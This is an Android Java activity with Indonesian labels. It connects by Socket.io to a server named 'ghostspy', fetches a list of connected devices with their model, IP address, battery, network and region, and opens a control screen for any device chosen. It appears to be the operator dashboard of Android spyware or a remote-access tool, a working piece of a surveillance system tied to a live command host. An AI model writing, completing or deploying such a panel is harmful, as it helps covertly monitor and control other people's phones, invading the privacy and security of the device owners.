package com.testapp;

import android.app.Activity;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.view.Gravity;
import android.view.animation.ScaleAnimation;
import android.widget.*;
import io.socket.client.IO;
import io.socket.client.Socket;
import org.json.JSONArray;
import org.json.JSONObject;
import java.net.URISyntaxException;
import java.util.ArrayList;
import java.util.List;

public class MainActivity extends Activity {
    private Socket socket;
    private TextView statusText;
    private LinearLayout deviceContainer;
    private Handler handler = new Handler();

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        // Root layout
        LinearLayout root = new LinearLayout(this);
        root.setOrientation(LinearLayout.VERTICAL);
        root.setBackgroundColor(0xFF090909);
        setContentView(root);

        // Header
        LinearLayout header = new LinearLayout(this);
        header.setOrientation(LinearLayout.HORIZONTAL);
        header.setGravity(Gravity.CENTER_VERTICAL);
        header.setBackgroundColor(0xFF171717);
        header.setPadding(16, 12, 16, 12);

        TextView title = new TextView(this);
        title.setText("📱 Perangkat");
        title.setTextColor(0xFFFFFFFF);
        title.setTextSize(20);
        title.setTypeface(null, android.graphics.Typeface.BOLD);
        LinearLayout.LayoutParams titleParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        title.setLayoutParams(titleParams);
        header.addView(title);

        statusText = new TextView(this);
        statusText.setText("⏳");
        statusText.setTextColor(0xFF00E676);
        statusText.setTextSize(12);
        statusText.setBackground(getDrawable(R.drawable.card_admin));
        statusText.setPadding(12, 6, 12, 6);
        header.addView(statusText);

        root.addView(header);

        // Filter Capsule
        LinearLayout filterBar = new LinearLayout(this);
        filterBar.setOrientation(LinearLayout.HORIZONTAL);
        filterBar.setPadding(16, 12, 16, 8);
        filterBar.addView(createChip("Semua", true));
        filterBar.addView(createChip("Online", false));
        filterBar.addView(createChip("Offline", false));
        root.addView(filterBar);

        // ScrollView untuk daftar perangkat
        ScrollView scroll = new ScrollView(this);
        deviceContainer = new LinearLayout(this);
        deviceContainer.setOrientation(LinearLayout.VERTICAL);
        deviceContainer.setPadding(16, 8, 16, 16);
        scroll.addView(deviceContainer);
        root.addView(scroll);

        // Socket.io
        try {
            socket = IO.socket("https://ghostspy.bruang.biz.id");
        } catch (URISyntaxException e) {
            statusText.setText("❌ URL Error");
            return;
        }

        socket.on(Socket.EVENT_CONNECT, args -> {
            runOnUiThread(() -> {
                statusText.setText("🟢 ONLINE");
                socket.emit("get_devices");
            });
        });

        socket.on("devices_list", args -> {
            try {
                JSONArray devices = (JSONArray) args[0];
                List<String[]> list = new ArrayList<>();
                for (int i = 0; i < devices.length(); i++) {
                    JSONObject d = devices.getJSONObject(i);
                    list.add(new String[]{
                        d.getString("id"),
                        d.getString("model"),
                        d.optString("android", "?"),
                        d.optString("ip", ""),
                        d.optString("last_seen", ""),
                        d.optString("battery", "?"),
                        d.optString("network", "?"),
                        d.optString("region", "")
                    });
                }
                runOnUiThread(() -> {
                    deviceContainer.removeAllViews();
                    if (list.isEmpty()) {
                        statusText.setText("📭 Tidak ada perangkat");
                        return;
                    }
                    int delay = 0;
                    for (String[] data : list) {
                        LinearLayout card = buildDeviceCard(data);
                        // Animasi masuk bertahap
                        card.setAlpha(0f);
                        deviceContainer.addView(card);
                        card.animate().alpha(1f).setStartDelay(delay).setDuration(200).start();
                        delay += 50;
                    }
                    statusText.setText("🟢 " + list.size() + " perangkat");
                });
            } catch (Exception e) {
                runOnUiThread(() -> statusText.setText("⚠️ Parse error"));
            }
        });

        socket.on(Socket.EVENT_CONNECT_ERROR, args -> {
            runOnUiThread(() -> statusText.setText("🔴 OFFLINE"));
        });

        socket.connect();
    }

    private TextView createChip(String text, boolean active) {
        TextView chip = new TextView(this);
        chip.setText(text);
        chip.setTextColor(0xFFFFFFFF);
        chip.setBackground(active ? getDrawable(R.drawable.btn_admin) : getDrawable(R.drawable.btn_outline_admin));
        chip.setPadding(16, 8, 16, 8);
        chip.setGravity(Gravity.CENTER);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.WRAP_CONTENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 0, 12, 0);
        chip.setLayoutParams(lp);
        return chip;
    }

    private LinearLayout buildDeviceCard(String[] data) {
        LinearLayout card = new LinearLayout(this);
        card.setOrientation(LinearLayout.VERTICAL);
        card.setBackground(getDrawable(R.drawable.card_admin));
        card.setPadding(20, 20, 20, 20);
        LinearLayout.LayoutParams lp = new LinearLayout.LayoutParams(
                LinearLayout.LayoutParams.MATCH_PARENT, LinearLayout.LayoutParams.WRAP_CONTENT);
        lp.setMargins(0, 0, 0, 12);
        card.setLayoutParams(lp);

        // Baris atas
        LinearLayout topRow = new LinearLayout(this);
        topRow.setOrientation(LinearLayout.HORIZONTAL);
        topRow.setGravity(Gravity.CENTER_VERTICAL);

        TextView modelView = new TextView(this);
        modelView.setText("📱 " + data[1]);
        modelView.setTextColor(0xFFFFFFFF);
        modelView.setTextSize(16);
        modelView.setTypeface(null, android.graphics.Typeface.BOLD);
        LinearLayout.LayoutParams modelParams = new LinearLayout.LayoutParams(
                0, LinearLayout.LayoutParams.WRAP_CONTENT, 1);
        modelView.setLayoutParams(modelParams);

        boolean online = data[4].contains("now") || data[4].contains("Just");
        TextView statusBadge = new TextView(this);
        statusBadge.setText(online ? "ONLINE" : "OFFLINE");
        statusBadge.setTextColor(online ? 0xFF00E676 : 0xFF9AA3B2);
        statusBadge.setTextSize(11);
        statusBadge.setBackgroundColor(0x22000000);
        statusBadge.setPadding(8, 4, 8, 4);

        topRow.addView(modelView);
        topRow.addView(statusBadge);
        card.addView(topRow);

        // Info
        TextView info = new TextView(this);
        info.setText("Android " + data[2] + " | IP: " + data[3] + "\nBat: " + data[5] + "% | " + data[7]);
        info.setTextColor(0xFF9AA3B2);
        info.setTextSize(12);
        card.addView(info);

        // Animasi klik
        card.setOnClickListener(v -> {
            ScaleAnimation scale = new ScaleAnimation(1f, 0.97f, 1f, 0.97f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f,
                    android.view.animation.Animation.RELATIVE_TO_SELF, 0.5f);
            scale.setDuration(100);
            scale.setRepeatCount(0);
            v.startAnimation(scale);

            Intent i = new Intent(MainActivity.this, ControlActivity.class);
            i.putExtra("deviceId", data[0]);
            i.putExtra("deviceModel", data[1]);
            i.putExtra("battery", data[5]);
            i.putExtra("network", data[6]);
            startActivity(i);
        });

        return card;
    }

    @Override
    protected void onDestroy() {
        if (socket != null) socket.disconnect();
        super.onDestroy();
    }
}
